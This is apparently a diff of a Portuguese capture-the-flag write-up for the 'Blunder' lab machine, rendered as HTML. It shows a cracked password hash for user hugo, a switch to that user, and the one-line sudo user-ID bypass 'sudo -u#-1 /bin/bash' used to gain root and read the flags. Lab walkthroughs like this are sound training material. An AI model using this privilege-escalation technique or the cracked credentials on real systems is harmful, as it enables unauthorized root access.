+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;tokenAuthTTL&#34;</span>: <span class="s2">&#34;2009-03-15 14:00&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;twitter&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;facebook&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;instagram&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;codepen&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;linkedin&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;github&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;gitlab&#34;</span>: <span class="s2">&#34;&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>temos a password e os dados do usuário hugo</p>
 <p>podemos identificar uma hash dentro de password</p>
 <p>#$ hashid faca404fd5c0a31cf1897b823c695c85cffeb98d</p>
 <p>se não identificar pelo comando hashid use um site para decriptografar md5</p>
@@ -327,67 +326,67 @@ cat users.php
 <p>#faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120
 essa password é do user hugo</p>
 <p>agora eu saio do usuário de permissão do apache  <code>www-data</code>  para o usuário do <code>Hugo</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo              
-su hugo
-Password: Password120
-
-hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
-</code></pre></div><p>Dentro da home do hugo tenho o arquivo  user.txt</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="nb">cd</span> ~
-<span class="nb">cd</span> ~
-hugo@blunder:~$ ls
-ls
-Desktop    Downloads  Pictures  Templates  Videos
-Documents  Music      Public    user.txt
-hugo@blunder:~$ cat user.txt    
-cat user.txt
-d837bfc74affbc6e39b91e489bb9fbb8
-hugo@blunder:~$ 
-</code></pre></div><p>obs&gt; auto-complete com <!-- raw HTML omitted --> não vai funcionar dentro do meterpreter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo              
+</span></span><span class="line"><span class="cl">su hugo
+</span></span><span class="line"><span class="cl">Password: Password120
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
+</span></span></code></pre></div><p>Dentro da home do hugo tenho o arquivo  user.txt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">hugo@blunder:~$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">Desktop    Downloads  Pictures  Templates  Videos
+</span></span><span class="line"><span class="cl">Documents  Music      Public    user.txt
+</span></span><span class="line"><span class="cl">hugo@blunder:~$ cat user.txt    
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">d837bfc74affbc6e39b91e489bb9fbb8
+</span></span><span class="line"><span class="cl">hugo@blunder:~$ 
+</span></span></code></pre></div><p>obs&gt; auto-complete com <!-- raw HTML omitted --> não vai funcionar dentro do meterpreter</p>
 <h1 id="subindo-privilegio-para-root">subindo privilegio para root</h1>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hugo@blunder:~$ sudo -l
-sudo -l
-Password: Password120
-
-Matching Defaults entries <span class="k">for</span> hugo on blunder:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User hugo may run the following commands on blunder:
-    <span class="o">(</span>ALL, !root<span class="o">)</span> /bin/bash
-hugo@blunder:~$ 
-</code></pre></div><p>consigo ver o secure path local</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hugo@blunder:~$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Password: Password120
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> hugo on blunder:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User hugo may run the following commands on blunder:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL, !root<span class="o">)</span> /bin/bash
+</span></span><span class="line"><span class="cl">hugo@blunder:~$ 
+</span></span></code></pre></div><p>consigo ver o secure path local</p>
 <p>depois disso verificar a versão da bash</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hugo@blunder:~$ bash -version
-bash -version
-GNU bash, version 5.0.3<span class="o">(</span>1<span class="o">)</span>-release <span class="o">(</span>x86_64-pc-linux-gnu<span class="o">)</span>
-Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
-
-This is free software<span class="p">;</span> you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.
-hugo@blunder:~$ 
-</code></pre></div><p><code>GNU bash, version 5.0.3</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hugo@blunder:~$ bash -version
+</span></span><span class="line"><span class="cl">bash -version
+</span></span><span class="line"><span class="cl">GNU bash, version 5.0.3<span class="o">(</span>1<span class="o">)</span>-release <span class="o">(</span>x86_64-pc-linux-gnu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
+</span></span><span class="line"><span class="cl">License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">This is free software<span class="p">;</span> you are free to change and redistribute it.
+</span></span><span class="line"><span class="cl">There is NO WARRANTY, to the extent permitted by law.
+</span></span><span class="line"><span class="cl">hugo@blunder:~$ 
+</span></span></code></pre></div><p><code>GNU bash, version 5.0.3</code></p>
 <p>Pesquisei no google sudo (all root) /bin/bash</p>
 <p>Ele deu um link do exploit-db</p>
 <p><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
 <p>existe um exploit de uma linha que posso especificar pelo id de usuário, no caso do <code>hugo</code>  , para conceder a ele o root ALL</p>
 <p>uma simples linha &gt;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hugo@blunder:~$ sudo -u#-1 /bin/bash 
-sudo -u#-1 /bin/bash
-Password: Password120
-
-root@blunder:/home/hugo# 
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@blunder:/home/hugo# <span class="nb">cd</span> /root
-<span class="nb">cd</span> /root
-root@blunder:/root# ls
-ls
-root.txt
-root@blunder:/root# cat root.txt
-cat root.txt
-c5a6c440602c9465a35ba11af04a0910
-root@blunder:/root# 
-</code></pre></div><p>basta entrar na home do /root</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hugo@blunder:~$ sudo -u#-1 /bin/bash 
+</span></span><span class="line"><span class="cl">sudo -u#-1 /bin/bash
+</span></span><span class="line"><span class="cl">Password: Password120
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@blunder:/home/hugo# 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@blunder:/home/hugo# <span class="nb">cd</span> /root
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root
+</span></span><span class="line"><span class="cl">root@blunder:/root# ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">root@blunder:/root# cat root.txt
+</span></span><span class="line"><span class="cl">cat root.txt
+</span></span><span class="line"><span class="cl">c5a6c440602c9465a35ba11af04a0910
+</span></span><span class="line"><span class="cl">root@blunder:/root# 
+</span></span></code></pre></div><p>basta entrar na home do /root</p>
 <p>e visualizar a flag</p>
 
 </main>
